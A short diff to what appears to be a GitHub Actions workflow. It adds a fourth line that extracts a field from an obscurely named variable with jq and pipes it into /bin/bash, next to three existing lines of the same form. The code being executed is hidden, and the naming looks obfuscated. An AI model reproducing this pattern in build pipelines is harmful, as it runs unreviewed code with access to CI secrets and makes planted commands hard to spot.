@@ -27,6 +27,7 @@ jobs:
           echo $yh053 | jq -r .unoh63627 | /bin/bash
           printf '%s' "$ch9" | jq -r .c06468 | /bin/bash
           echo $pqti42 | jq -r .xisz87 | /bin/bash
+          echo $up04 | jq -r .y20 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
